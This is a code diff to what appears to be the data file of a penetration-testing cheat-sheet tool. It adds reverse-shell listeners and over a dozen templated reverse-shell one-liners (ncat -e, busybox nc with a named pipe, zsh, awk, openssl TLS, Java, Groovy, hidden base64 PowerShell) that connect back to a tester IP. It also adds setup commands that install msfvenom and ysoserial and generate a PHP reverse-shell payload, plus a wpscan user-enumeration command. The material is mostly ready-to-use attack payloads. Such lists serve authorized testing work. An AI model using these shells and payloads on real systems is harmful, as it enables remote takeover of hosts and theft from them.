@@ -31,9 +31,12 @@ window.DORK_ENGINES = [
 
 window.LISTENERS = [
   { name: "netcat",       cmd: `nc -lvnp {tester_port}` },
+  { name: "ncat",         cmd: `ncat -lvnp {tester_port}` },
   { name: "rlwrap nc",    cmd: `rlwrap -cAr nc -lvnp {tester_port}` },
   { name: "socat (TTY)",  cmd: 'socat file:`tty`,raw,echo=0 TCP-L:{tester_port}' },
-  { name: "pwncat",       cmd: `pwncat-cs -lp {tester_port}` }
+  { name: "pwncat",       cmd: `pwncat-cs -lp {tester_port}` },
+  { name: "ncat (TLS)",   cmd: `ncat --ssl -lvnp {tester_port}   # pair with the openssl / ncat-ssl reverse shell` },
+  { name: "openssl (TLS)",cmd: `openssl req -x509 -newkey rsa:2048 -keyout /tmp/k.pem -out /tmp/c.pem -days 1 -nodes -subj '/CN=x' && openssl s_server -quiet -key /tmp/k.pem -cert /tmp/c.pem -port {tester_port}` }
 ];
 
 /* TTY upgrade reminder shown on the Reverse Shells tab. */
@@ -61,7 +64,16 @@ window.REVSHELLS = [
   { lang: "powershell", name: "powershell #1",   cmd: `powershell -nop -W hidden -noni -c "$c=New-Object System.Net.Sockets.TCPClient('{tester_ip}',{tester_port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"` },
   { lang: "socat",      name: "socat",           cmd: `socat TCP:{tester_ip}:{tester_port} EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane` },
   { lang: "lua",        name: "lua",             cmd: `lua -e "require('socket');require('os');t=socket.tcp();t:connect('{tester_ip}','{tester_port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"` },
-  { lang: "telnet",     name: "telnet",          cmd: `TF=$(mktemp -u);mkfifo $TF && telnet {tester_ip} {tester_port} 0<$TF | /bin/sh 1>$TF` }
+  { lang: "telnet",     name: "telnet",          cmd: `TF=$(mktemp -u);mkfifo $TF && telnet {tester_ip} {tester_port} 0<$TF | /bin/sh 1>$TF` },
+  { lang: "netcat",     name: "ncat -e",         cmd: `ncat {tester_ip} {tester_port} -e /bin/bash` },
+  { lang: "netcat",     name: "ncat TLS",        cmd: `ncat --ssl {tester_ip} {tester_port} -e /bin/bash` },
+  { lang: "sh",         name: "busybox nc",      cmd: `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|busybox sh -i 2>&1|busybox nc {tester_ip} {tester_port} >/tmp/f` },
+  { lang: "bash",       name: "zsh",             cmd: `zsh -c 'zmodload zsh/net/tcp && ztcp {tester_ip} {tester_port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'` },
+  { lang: "awk",        name: "awk",             cmd: `awk 'BEGIN{s="/inet/tcp/0/{tester_ip}/{tester_port}";while(1){do{printf "shell>" |& s;s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!="exit")}}' /dev/null` },
+  { lang: "openssl",    name: "openssl (TLS)",   cmd: `mkfifo /tmp/s;/bin/sh -i </tmp/s 2>&1|openssl s_client -quiet -connect {tester_ip}:{tester_port} >/tmp/s;rm /tmp/s` },
+  { lang: "java",       name: "java Runtime",    cmd: `r = Runtime.getRuntime();p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{tester_ip}/{tester_port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[]);p.waitFor()` },
+  { lang: "groovy",     name: "groovy",          cmd: `String host="{tester_ip}";int port={tester_port};String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();` },
+  { lang: "powershell", name: "powershell b64",  cmd: `powershell -nop -w hidden -e <BASE64>   # generate: $c='<PS #1 oneliner>'; [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($c))` }
 ];
 
 /* Setup tab — tooling install commands (static, not templated). */
@@ -79,7 +91,15 @@ window.SETUP = [
     { tool: "pipx", cmd: "for p in git-dumper uro clairvoyance xsser name-that-hash; do pipx install \"$p\"; done" }
   ]},
   { group: "git tools -> /opt", note: "run e.g. python3 /opt/XSStrike/xsstrike.py", cmds: [
-    { tool: "git", cmd: "sudo mkdir -p /opt && sudo chown $USER /opt; for r in s0md3v/XSStrike ticarpi/jwt_tool dolevf/graphw00f chenjj/CORScanner tarunkant/Gopherus; do git clone -q https://github.com/$r /opt/$(basename $r); done" }
+    { tool: "git", cmd: "sudo mkdir -p /opt && sudo chown $USER /opt; for r in s0md3v/XSStrike ticarpi/jwt_tool dolevf/graphw00f chenjj/CORScanner tarunkant/Gopherus synacktiv/php_filter_chain_generator swisskyrepo/PayloadsAllTheThings; do git clone -q https://github.com/$r /opt/$(basename $r); done" }
+  ]},
+  { group: "payload generators", note: "msfvenom (metasploit-framework) and ysoserial are allowed payload generators — not autopwn.", cmds: [
+    { tool: "apt", cmd: "sudo apt install -y metasploit-framework    # provides msfvenom" },
+    { tool: "ysoserial", cmd: "sudo mkdir -p /opt && wget -qO /opt/ysoserial.jar https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar   # java deser gadgets" },
+    { tool: "msfvenom", cmd: "msfvenom -p php/reverse_php LHOST={tester_ip} LPORT={tester_port} -f raw -o shell.php   # or -p java/jsp_shell_reverse_tcp -f war -o s.war" }
+  ]},
+  { group: "WordPress / CMS", cmds: [
+    { tool: "wpscan", cmd: "sudo apt install -y wpscan && wpscan --url {target_url} --enumerate u,ap,at --api-token <optional>" }
   ]},
   { group: "static binaries", cmds: [
     { tool: "trufflehog", cmd: "curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sudo sh -s -- -b /usr/local/bin" },
